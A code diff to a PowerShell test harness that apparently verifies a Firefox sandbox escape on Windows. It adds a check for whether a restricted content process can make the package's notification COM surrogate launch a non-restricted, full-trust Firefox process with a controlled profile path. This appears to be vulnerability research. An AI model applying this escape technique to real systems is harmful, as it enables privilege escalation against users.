@@ -49,6 +49,9 @@ $Verdict = [ordered]@{
     shell_dispatch_api_success = $false
     shell_dispatch_hresult = $null
     shell_dispatch_process_observed = $false
+    notification_activation_success = $false
+    notification_activation_hresult = $null
+    notification_activation_process_observed = $false
     background_task_registered = $false
     background_task_registration_hresult = $null
     background_proxy_process_observed = $false
@@ -149,6 +152,9 @@ function Write-Summary {
         "- Shell.Application activation succeeded: ``$($Result.shell_dispatch_api_success)``",
         "- Shell.Application HRESULT: ``$($Result.shell_dispatch_hresult)``",
         "- Shell.Application process observed: ``$($Result.shell_dispatch_process_observed)``",
+        "- Notification COM activation succeeded: ``$($Result.notification_activation_success)``",
+        "- Notification COM HRESULT: ``$($Result.notification_activation_hresult)``",
+        "- Notification COM process observed: ``$($Result.notification_activation_process_observed)``",
         "- Renderer registered package timer: ``$($Result.background_task_registered)``",
         "- Background registration HRESULT: ``$($Result.background_task_registration_hresult)``",
         "- Background-task proxy process observed: ``$($Result.background_proxy_process_observed)``"
@@ -300,7 +306,8 @@ exit /b %errorlevel%
     $EscapedProfile = Join-Path $ProfilesRoot "escaped-$Nonce"
     $ShellExecuteProfile = Join-Path $ProfilesRoot "shell-execute-$Nonce"
     $ShellDispatchProfile = Join-Path $ProfilesRoot "shell-dispatch-$Nonce"
-    New-Item -ItemType Directory -Path $InitialProfile, $EscapedProfile, $ShellExecuteProfile, $ShellDispatchProfile -Force | Out-Null
+    $NotificationProfile = Join-Path $ProfilesRoot "notification-$Nonce"
+    New-Item -ItemType Directory -Path $InitialProfile, $EscapedProfile, $ShellExecuteProfile, $ShellDispatchProfile, $NotificationProfile -Force | Out-Null
     @(
         'user_pref("browser.shell.checkDefaultBrowser", false);',
         'user_pref("browser.startup.page", 0);',
@@ -337,6 +344,7 @@ exit /b %errorlevel%
         "--launch-args", $EscapedArguments,
         "--shell-execute-args", $ShellExecuteArguments,
         "--shell-dispatch-args", $ShellDispatchArguments,
+        "--notification-profile", $NotificationProfile,
         "--background-task-name", $BackgroundTaskName,
         "--aumid", $InstalledEvidence.aumid
     ) -EvidenceName "injection.json"
@@ -359,6 +367,8 @@ exit /b %errorlevel%
     $Verdict.shell_execute_error = $Injection.shell_execute_error
     $Verdict.shell_dispatch_api_success = [bool]($Injection.shell_dispatch_hresult -eq 0)
     $Verdict.shell_dispatch_hresult = $Injection.shell_dispatch_hresult_hex
+    $Verdict.notification_activation_success = [bool]($Injection.notification_activation_hresult -eq 0)
+    $Verdict.notification_activation_hresult = $Injection.notification_activation_hresult_hex
     $Verdict.background_task_registered = [bool]$Injection.background_registered
     $Verdict.background_task_registration_hresult = $Injection.background_register_hresult_hex
     $LaunchedProcess = $null
@@ -392,7 +402,23 @@ exit /b %errorlevel%
         }
     }
 
-    if ($Verdict.shell_execute_api_success) {
+    if ($Verdict.notification_activation_success) {
+        $NotificationProcess = Wait-EscapedFirefoxProcess -ProfileMarker $NotificationProfile -Deadline (Get-Date).AddSeconds(45)
+        if ($null -ne $NotificationProcess) {
+            $NotificationSnapshot = Invoke-DriverJson -Arguments @("inspect", "--pid", $NotificationProcess.ProcessId.ToString()) -EvidenceName "notification-launched.json"
+            $NotificationMarkerObserved = [bool]($NotificationSnapshot.command_line -like "*$NotificationProfile*")
+            $NotificationTokenObserved = [bool](
+                $NotificationSnapshot.integrity_rid -ge 8192 -and
+                -not $NotificationSnapshot.is_restricted -and
+                $NotificationSnapshot.package_family -eq $InstalledPackage.PackageFamilyName
+            )
+            $Verdict.notification_activation_process_observed = [bool]($NotificationMarkerObserved -and $NotificationTokenObserved)
+            $Verdict.controlled_arguments_observed = [bool]($Verdict.controlled_arguments_observed -or $NotificationMarkerObserved)
+            $Verdict.full_trust_token_observed = [bool]($Verdict.full_trust_token_observed -or $NotificationTokenObserved)
+        }
+    }
+
+    if (-not $Verdict.notification_activation_process_observed -and $Verdict.shell_execute_api_success) {
         $ShellExecuteProcess = Wait-EscapedFirefoxProcess -ProfileMarker $ShellExecuteProfile -Deadline (Get-Date).AddSeconds(45)
         if ($null -ne $ShellExecuteProcess) {
             $ShellExecuteSnapshot = Invoke-DriverJson -Arguments @("inspect", "--pid", $ShellExecuteProcess.ProcessId.ToString()) -EvidenceName "shell-execute-launched.json"
@@ -408,7 +434,7 @@ exit /b %errorlevel%
         }
     }
 
-    if ($Verdict.shell_dispatch_api_success) {
+    if (-not $Verdict.notification_activation_process_observed -and $Verdict.shell_dispatch_api_success) {
         $ShellDispatchProcess = Wait-EscapedFirefoxProcess -ProfileMarker $ShellDispatchProfile -Deadline (Get-Date).AddSeconds(45)
         if ($null -ne $ShellDispatchProcess) {
             $ShellDispatchSnapshot = Invoke-DriverJson -Arguments @("inspect", "--pid", $ShellDispatchProcess.ProcessId.ToString()) -EvidenceName "shell-dispatch-launched.json"
@@ -441,7 +467,10 @@ exit /b %errorlevel%
     }
     Write-JsonFile -Value (Get-FirefoxProcesses | Select-Object ProcessId, ParentProcessId, CommandLine) -Path (Join-Path $ArtifactRoot "processes-after.json")
 
-    if ($Verdict.shell_execute_process_observed) {
+    if ($Verdict.notification_activation_process_observed) {
+        $Verdict.status = "CONFIRMED_NOTIFICATION_COM_PROXY"
+        $Verdict.reason = "A restricted untrusted-integrity Firefox content process invoked the package notification COM surrogate with a controlled profile path. The surrogate launched a non-restricted packaged Firefox process carrying that unique path."
+    } elseif ($Verdict.shell_execute_process_observed) {
         $Verdict.status = "CONFIRMED_SHELL_EXECUTE_BROKER"
         $Verdict.reason = "A restricted untrusted-integrity Firefox content process asked the shell namespace to activate the package with controlled arguments. Windows launched a non-restricted packaged Firefox process carrying the unique profile marker."
     } elseif ($Verdict.shell_dispatch_process_observed) {
